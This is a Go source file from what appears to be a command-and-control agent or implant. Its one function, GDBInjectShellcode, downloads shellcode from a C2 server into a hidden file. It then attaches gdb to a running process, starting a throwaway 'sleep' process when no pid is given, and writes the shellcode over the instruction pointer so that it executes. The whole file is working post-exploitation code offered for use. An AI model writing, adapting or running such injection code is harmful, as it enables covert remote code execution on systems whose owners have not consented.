package agent

import (
	"fmt"
	"io/ioutil"
	"os/exec"
	"strconv"
)

// GDBInjectShellcode inject shellcode to a running process using GDB
// start a `sleep` process and inject to it if pid == 0
// gdb command: set (char[length])*(int*)$rip = { 0xcc }
func GDBInjectShellcode(pid int) error {
	if pid == 0 {
		cmd := exec.Command("sleep", "10")
		err := cmd.Start()
		if err != nil {
			return err
		}
		pid = cmd.Process.Pid
	}
	shellcodeFile := AgentRoot + "/.s"
	err := DownloadViaCC(CCAddress+"/shellcode.txt", shellcodeFile)
	if err != nil {
		return err
	}
	shellcode, err := ioutil.ReadFile(shellcodeFile)
	if err != nil {
		return err
	}
	shellcodeLen := len(shellcode)

	out, err := exec.Command(UtilsPath+"/gdb", "-q", "-ex", fmt.Sprintf("set (char[%d]*(int*)$rip={%s})", shellcodeLen, shellcode), "-ex", "c", "-ex", "q", "-p", strconv.Itoa(pid)).CombinedOutput()
	if err != nil {
		return fmt.Errorf("GDB failed: %s\n%v", out, err)
	}

	return nil
}
